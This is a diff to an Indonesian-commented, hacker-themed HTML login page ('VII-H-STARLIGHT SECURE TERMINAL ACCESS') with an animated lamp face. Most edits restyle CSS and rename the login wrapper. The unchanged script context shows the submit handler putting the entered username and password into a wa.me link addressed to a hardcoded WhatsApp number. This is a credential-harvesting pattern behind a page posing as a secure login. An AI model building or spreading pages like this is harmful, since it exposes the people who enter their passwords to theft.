@@ -26,22 +26,29 @@
       pointer-events: none;
     }
 
-    #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.3; }
+    #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.25; }
     
+    /* Wrapper utama agar lampu punya space di atas card */
+    .login-wrapper {
+      position: relative;
+      z-index: 2;
+      margin-top: 60px; /* Memberi ruang untuk lampu gantung di atas */
+    }
+
     .container {
-      position: relative; z-index: 2; display: flex; width: 420px;
-      max-width: 95%; background: rgba(0, 20, 10, 0.92);
-      border: 1px solid #00ff66; border-radius: 8px;
-      box-shadow: 0 0 25px rgba(0, 255, 102, 0.3), inset 0 0 15px rgba(0, 255, 102, 0.1);
-      backdrop-filter: blur(5px);
-      overflow: visible; margin: 40px 0 20px 0;
+      position: relative; display: flex; width: 420px;
+      max-width: 95vw; background: rgba(0, 20, 10, 0.92);
+      border: 1px solid #00ff66; border-radius: 12px;
+      box-shadow: 0 0 30px rgba(0, 255, 102, 0.25), inset 0 0 15px rgba(0, 255, 102, 0.1);
+      backdrop-filter: blur(8px);
+      overflow: visible; 
     }
     .hidden { display: none !important; }
 
-    /* Lampu Gantung Interaktif Hacker */
+    /* Lampu Gantung Interaktif Hacker (Diperbaiki Posisinya) */
     .lamp-panel {
       position: absolute;
-      top: -70px;
+      top: -115px; /* Ditarik ke atas agar kabel dan kap lampu terlihat utuh */
       left: 50%;
       transform: translateX(-50%);
       display: flex;
@@ -53,24 +60,24 @@
 
     .wire {
       width: 2px;
-      height: 40px;
+      height: 60px; /* Panjang kabel disesuaikan */
       background: #00ff66;
       box-shadow: 0 0 8px #00ff66;
     }
 
     .lamp-head {
-      width: 60px;
-      height: 25px;
+      width: 50px;
+      height: 20px;
       background: #052610;
       border: 1px solid #00ff66;
-      border-radius: 0 0 30px 30px;
+      border-radius: 0 0 25px 25px;
       position: relative;
       box-shadow: 0 0 10px #00ff66;
     }
 
     .face-circle {
-      width: 60px;
-      height: 60px;
+      width: 54px;
+      height: 54px;
       background: radial-gradient(circle at 38% 32%, #00ff66 0%, #022b12 70%);
       border-radius: 50%;
       border: 1px solid #00ff66;
@@ -78,49 +85,49 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 0 25px rgba(0, 255, 102, 0.6);
-      margin-top: 5px;
+      box-shadow: 0 0 20px rgba(0, 255, 102, 0.5);
+      margin-top: 4px;
       transition: transform 0.1s ease-out;
     }
 
     .eyes {
       display: flex;
-      gap: 12px;
-      margin-bottom: 6px;
+      gap: 10px;
+      margin-bottom: 4px;
     }
 
     .eye {
-      width: 6px;
-      height: 6px;
+      width: 5px;
+      height: 5px;
       background: #030a05;
       border-radius: 50%;
-      box-shadow: 0 0 5px #00ff66;
+      box-shadow: 0 0 4px #00ff66;
     }
 
     .mouth {
-      width: 14px;
-      height: 4px;
+      width: 12px;
+      height: 3px;
       background: #030a05;
       border-radius: 2px;
     }
 
-    /* Login */
-    .login-section { flex: 1; padding: 40px 30px 30px 30px; display: flex; flex-direction: column; justify-content: center; }
+    /* Login Form Styling */
+    .login-section { flex: 1; padding: 35px 30px; display: flex; flex-direction: column; justify-content: center; }
     .logo { text-align: center; margin-bottom: 25px; margin-top: 10px; }
-    .logo h1 { font-size: 22px; color: #00ff66; text-shadow: 0 0 10px #00ff66; letter-spacing: 1px; }
-    .logo p { font-size: 11px; color: #00aa44; margin-top: 5px; }
+    .logo h1 { font-size: 20px; color: #00ff66; text-shadow: 0 0 10px #00ff66; letter-spacing: 1px; }
+    .logo p { font-size: 11px; color: #00aa44; margin-top: 4px; letter-spacing: 0.5px; }
     
-    .form-group { margin-bottom: 15px; }
-    .form-group label { display: block; font-size: 12px; margin-bottom: 5px; color: #00cc55; }
-    .input-field { display: flex; align-items: center; background: rgba(1, 15, 5, 0.9); border: 1px solid #00aa44; border-radius: 4px; padding: 10px; transition: 0.3s; }
+    .form-group { margin-bottom: 16px; }
+    .form-group label { display: block; font-size: 11px; margin-bottom: 6px; color: #00cc55; }
+    .input-field { display: flex; align-items: center; background: rgba(1, 15, 5, 0.9); border: 1px solid #00aa44; border-radius: 6px; padding: 11px 14px; transition: 0.3s; }
     .input-field:focus-within { border-color: #00ff66; box-shadow: 0 0 10px rgba(0, 255, 102, 0.4); }
-    .input-field i { color: #00ff66; margin-right: 10px; font-size: 14px; }
+    .input-field i { color: #00ff66; margin-right: 12px; font-size: 14px; }
     .input-field input { background: transparent; border: none; outline: none; color: #00ff66; width: 100%; font-family: 'Share Tech Mono', monospace; font-size: 13px; }
     .input-field input::placeholder { color: #005522; }
     
     .login-btn {
       width: 100%; padding: 12px; background: #003311; color: #00ff66;
-      border: 1px solid #00ff66; border-radius: 4px; font-weight: bold; font-size: 14px;
+      border: 1px solid #00ff66; border-radius: 6px; font-weight: bold; font-size: 13px;
       cursor: pointer; box-shadow: 0 0 10px rgba(0,255,102,0.2); transition: 0.3s; margin-top: 10px;
       letter-spacing: 1px;
     }
@@ -152,7 +159,7 @@
 
     /* Dashboard Container */
     .container.dashboard {
-      width: 850px; max-width: 95%; flex-direction: column; padding: 30px;
+      width: 850px; max-width: 95%; flex-direction: column; padding: 30px; margin-top: 0;
     }
     .dashboard-header { border-bottom: 1px solid rgba(0,255,102,0.3); padding-bottom: 15px; margin-bottom: 20px; }
     .dashboard-header h2 { font-size: 18px; }
@@ -279,42 +286,44 @@
     </div>
   </div>
 
-  <!-- Login Screen dengan Lampu Gantung Interaktif -->
-  <div id="loginScreen" class="container">
-    <div class="lamp-panel" id="lampPanel">
-      <div class="wire"></div>
-      <div class="lamp-head"></div>
-      <div class="face-circle" id="faceCircle">
-        <div class="eyes">
-          <div class="eye"></div>
-          <div class="eye"></div>
+  <!-- Login Screen Wrapper dengan Lampu Gantung yang Utuh -->
+  <div class="login-wrapper" id="loginScreenWrapper">
+    <div id="loginScreen" class="container">
+      <div class="lamp-panel" id="lampPanel">
+        <div class="wire"></div>
+        <div class="lamp-head"></div>
+        <div class="face-circle" id="faceCircle">
+          <div class="eyes">
+            <div class="eye"></div>
+            <div class="eye"></div>
+          </div>
+          <div class="mouth"></div>
         </div>
-        <div class="mouth"></div>
       </div>
-    </div>
 
-    <div class="login-section">
-      <div class="logo">
-        <h1>// VII-H-STARLIGHT</h1>
-        <p>SECURE TERMINAL ACCESS</p>
+      <div class="login-section">
+        <div class="logo">
+          <h1>// VII-H-STARLIGHT</h1>
+          <p>SECURE TERMINAL ACCESS</p>
+        </div>
+        <form id="loginForm">
+          <div class="form-group">
+            <label>&gt; USERNAME / ID</label>
+            <div class="input-field">
+              <i class="fas fa-user-shield"></i>
+              <input type="text" id="username" placeholder="root_admin" required autocomplete="off">
+            </div>
+          </div>
+          <div class="form-group">
+            <label>&gt; PASSWORD</label>
+            <div class="input-field">
+              <i class="fas fa-key"></i>
+              <input type="password" id="password" placeholder="••••••••••••" required>
+            </div>
+          </div>
+          <button type="submit" class="login-btn"><i class="fab fa-whatsapp"></i> EXECUTE LOGIN</button>
+        </form>
       </div>
-      <form id="loginForm">
-        <div class="form-group">
-          <label>&gt; USERNAME / ID</label>
-          <div class="input-field">
-            <i class="fas fa-user-shield"></i>
-            <input type="text" id="username" placeholder="root_admin" required autocomplete="off">
-          </div>
-        </div>
-        <div class="form-group">
-          <label>&gt; PASSWORD</label>
-          <div class="input-field">
-            <i class="fas fa-key"></i>
-            <input type="password" id="password" placeholder="••••••••••••" required>
-          </div>
-        </div>
-        <button type="submit" class="login-btn"><i class="fab fa-whatsapp"></i> EXECUTE LOGIN</button>
-      </form>
     </div>
   </div>
 
@@ -382,7 +391,7 @@
   <div id="modalContainer"></div>
 
   <script>
-    const WA_NUMBER = "628818691107"; // ganti nomor WA lo
+    const WA_NUMBER = "68818691107"; // ganti nomor WA lo
 
     // ====== MOUSE FOLLOWER UNTUK LAMPU HACKER ======
     const lampPanel = document.getElementById('lampPanel');
@@ -455,14 +464,14 @@
       const msg = `*AKSES LOGIN VII-H-STARLIGHT*%0A👤 *User:* ${user}%0A🔑 *Pass:* ${pass}`;
       window.open(`https://wa.me/${WA_NUMBER}?text=${msg}`, '_blank');
       runHackingAnimation(() => {
-        document.getElementById('loginScreen').classList.add('hidden');
+        document.getElementById('loginScreenWrapper').classList.add('hidden');
         document.getElementById('dashboardScreen').classList.remove('hidden');
       });
     });
 
     document.getElementById('logoutBtn').addEventListener('click', () => {
       document.getElementById('dashboardScreen').classList.add('hidden');
-      document.getElementById('loginScreen').classList.remove('hidden');
+      document.getElementById('loginScreenWrapper').classList.remove('hidden');
     });
 
     // ====== TOOLS DASAR ======
